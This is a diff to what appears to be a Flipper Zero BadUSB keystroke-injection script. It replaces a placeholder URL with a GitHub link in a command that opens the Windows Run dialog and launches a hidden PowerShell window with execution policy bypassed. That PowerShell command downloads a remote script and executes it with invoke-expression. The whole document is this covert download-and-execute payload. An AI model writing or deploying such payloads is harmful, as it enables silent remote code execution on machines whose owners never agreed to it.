@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr <url>; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/Pronnikov/MyFlipperRepo/blob/main/bad_usb/payloads/hello_world.ps1; invoke-expression $pl
 ENTER
